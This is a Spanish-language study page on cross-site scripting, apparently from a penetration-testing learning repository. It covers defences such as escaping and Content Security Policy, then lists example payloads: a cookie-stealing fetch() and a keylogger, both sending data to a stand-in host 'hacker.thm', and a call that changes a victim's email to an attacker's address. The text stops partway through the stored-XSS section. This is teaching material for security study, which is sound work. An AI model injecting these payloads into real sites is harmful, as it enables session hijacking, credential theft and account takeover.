<p align="right"><img height=100px width=100px src="https://github.com/user-attachments/assets/28eba669-a8dd-418a-bc8d-cc7c8e147edc"></p>

<p align="center"><img src="https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/6f0d0415-0442-48c8-ab8e-f78062b511a3"></p>


<h1 align="center">Cross-site scripting (XSS)</h1>

# ÍNDICE

- [PROTECCIÓN](https://github.com/D4l1-web/PenetrationTester-Ruta/blob/main/Cross-Site%20Scripting.md#protecci%C3%B3n)
- [IMPLEMENTAR CONTENIDO SEGURO](https://github.com/D4l1-web/PenetrationTester-Ruta/blob/main/Cross-Site%20Scripting.md#implementar-contenido-seguro-de-privacidad)


Cross-site scripting (XSS) es uno de los metodos mas comunes que los hackers utilizan para atacar paginas webs. Permite al usuario malicioso ejecutar codigo arbitrario JavaScript cuando otros usuarios visitan la página.

XSS es una de las vunerabilidades que más se reportan en los sitios web. 

¿Qué puede hacer un hacker explotando una vulnerabilidad XSS?

XSS ejecuta arbitrariamente codigo JavaScript, el daño que puedan hacer depende de la sensibilidad de los datos que pueda proveer dicha página.

- Se podrían difundir gusanos en las páginas como "Facebook, Twitter"
- Robo de sesión, pudiendo coger las cookies remotamente.
- Robo de identidad, Información confidencial tarjetas, numeros, etc.
- Denegación de servicio.
- Robo de datos sensibles, como contraseñas.
- Fraude financiero en bancos.

# Protección 

Para poder ser protegido por estos ataques, tendremos que tener seguros que nuestro contenido dinamico que puedas enviar datos, puedas inyectar codigo JavaScript.

Todas las páginas estan hechas con HTML, usualmente describen el tema y los ficheros, lo utilizariamos con contenido dinamico y cuando la pagina se volivera a cargar parariamos.

Con "Stored XSS attacks" hacemos que dentro del contenido dinamico podamos guardan contenido en el "backend". El atacante abusa de archivos que se pueden editar e insertar codigo JavaScript, evaluado por el navegador cuando otro usuario visita la página.

A menos que tu sitio web sea un (CMS), es raro que sus usuarios puedan crear "HTML" sin formato, debee escapar de todo el contenido dinámico que se pueda almacenar datos y el navegador sepa que solo pueda aceptar etiquetas "HTML"

![image](https://github.com/pons-rgb/vuln/assets/174595469/07f4790a-365a-4360-b818-3557e00734a8)

## VALORES DE LISTA PERMITIDOS

Si un particular dato dinamico de cada item puede tener solo algunos valores validos, la mejor practica es restringir estos valores, solo permitir los valores que necesitemos.

## IMPLEMENTAR CONTENIDO SEGURO DE PRIVACIDAD

Los navegadores puedes suportear contenido de seguridad y sus politicas, cuando el autor tiene el control de la página web, donde "JavaSCript y otros valores" pueden ser ejecutados. Los ataques XSS pueden hasta llegar a correr código malicioso en la página del usuario. Injectando 
```
<script></script>
```
Obviamente con el tag de html.

Una buena privacidad de seguridad, un header responsivo, y decirle al navegador que nunca ejecute arbitrariamente código "JavaScript", y bloquear los dominios que contengan host "JavaScript" para la página.

Por ejemplo le podrías decir al navegador.
![image](https://github.com/pons-rgb/vuln/assets/174595469/9dab6c46-d5b9-4543-9cb6-85e11dadeea9)

Listar los scripts que no queremos que se ejecuten.
![image](https://github.com/pons-rgb/vuln/assets/174595469/a9f6348a-9083-4639-9ad8-c34fc80818a7)

Esto protejera a los usuarios efectivamente, sin embargo esto no hace que sea 100 por cien seguro.

# XSS PAYLOAD

En XSS, los payloados son código JS que se ejecutan en el ordenador víctima. Hay dos partes del payload, la intención y la modificación.

La intención que tenga JS, la modificacion cambia el codigo que necesitamos para ejecutar en diferentes escnarios

### PROOF OF CONCEPT

Estos sin payloads simples que demostran XSS en las aplicaciones web
```
<script>alert('XSS');</script>
```

### ROBO DE SESIÓN

Los detalles de la sesión de usuario, son con logins de tokens, aveces conseguiremos las cookies de la maquina víctima. Debajo del script de JS, base64 docificados esta la cookie para una tranmisión y no pueda un hacker tener el contro. Si el atacante consigue las cookies del usuario puede entrar sin necesidad de logearse. 

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

### KEY LOGGER

El código debajo del key logger. Cualquier cosa que escribas en la página web será reenviada a un sitio web bajo el control del hacker. Esto puede ser muy dañino para la pagina web porque el payload esta instalado para coger las credenciales del login o tarjetas de crédito.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

### LÓGICA DE NEGOCIO

Este payload es mucho más específico que los otros. Esto se hacer para llamar a un recursos en particular de la red o una función JS. Por ejemplo, imaginemos que la funcion de JavaScript cambia el email de usuario llamado "user.changeEmail()". 

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Hace que la cuenta de correo se cambie, para que el atacante tenga posibilidad de resetear la contraseña.

# XSS REFLEJADO

El XSS refleajdo se hace cuando una consulta HTTP incluye codigo de la página web sin validación.

### ESCENARIO DE EJEMPLO

Una pagina web que si introduces un input mal, te sale un mensaje que te lo dice. 

![image](https://github.com/user-attachments/assets/a31c654f-0d48-43ea-8a22-7e61ff216612)

Esta aplicación no necesita chekear el contenido si es un parametro de error, haciendo que podamos insertar codigo malicioso.

![image](https://github.com/user-attachments/assets/65bd6e80-dd7c-4a9d-a42f-da6f74a779f7)

![image](https://github.com/user-attachments/assets/38b15606-2d58-4aaf-971a-6f09af6e6289)

### IMPACTO POTENCIAL

El atacante puede mandar links o redirecciones dentro del iframe de otra web, contenido JS payload potencial para las victimas, potencial reverse shell o información del customer.

## COMO TESTEAR UN REFLECTED XSS

Necesitaremos siempre testear todas las posibilidades incluyendo:

- Parametros en una consulta con URL
- Ruta de la URL
- Cabeceras HTTP

# STORED XSS

Como el nombre se refiere, este tipo de payload se guarda en la aplicación web (en la base de datos)

### EJEMPLO

En un blog los usuarios pueden mandar post. Desafortunadamente, estos comentarios no se chekean por código JS


